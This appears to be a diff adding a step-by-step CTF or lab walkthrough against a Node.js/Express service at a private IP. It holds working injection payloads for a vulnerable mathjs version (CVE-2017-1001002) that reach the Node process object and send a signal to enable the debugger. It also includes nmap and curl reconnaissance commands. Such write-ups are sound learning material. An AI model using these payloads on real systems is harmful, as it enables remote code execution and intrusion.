@@ -1,0 +1,27 @@
+1. apply nmap -sS -sV -sC -p- 10.0.30.60 -vvv -oN scan_machine
+2. We found two open port the which are 80 protocol HTTP and 9229 
+same protocol too.
+3. apply command curl -I(info head) http://10.0.30.60 and http://10.0.30.60:9229
+4. the last command we can see the run service Ngnix
+5. I saw in chrome tools what at give clik in calculate its execute a 
+funciton post with value in equation to /got_maths/maths.
+6. apply curl -I http://10.0.30.60/got_maths/maths
+7. we saw that service go of Ngnix to Express.
+8. type of vulnerability is cve-2017-1001002 with respect to library math
+9. trying send equation 6+4 with curl 
+ curl --data-urlencoded 'equation=4+6' "http://10.0.30.60/got_maths/maths"
+10.now we know that there is a nodejs's program  and we can prove it with 
+option help 
+11. apply curl --data-urlencode 'equation=version' "http://10.0.30.60/got_maths/maths"
+12. we saw version of mathjs (3.10.1)
+13. we found vulnerabiluty cve up mention
+14. with the before, we try to prove 
+curl --data-urlencode 'equation=cos.constructor("return process")()' "http://10.0.30.60/got_maths/maths" 
+15. result: [object process]
+16. with that in mind, we prove send instruction to desactive SIGNUSR1
+16.1 because is reserved by Node.js to start the debugger. 
+17. with option kill sends a signal to a specified process 
+18. the method is the follow:
+curl --data-urlencode 'equation=cos.constructor("return process.kill(process.pid,10)")()' "http://10.0.30.60/got_maths/maths"
+19.again typing curl -I http://10.0.30.60:9229
+20. I saw 400 Bad request very diferent to 502 Bad gateway
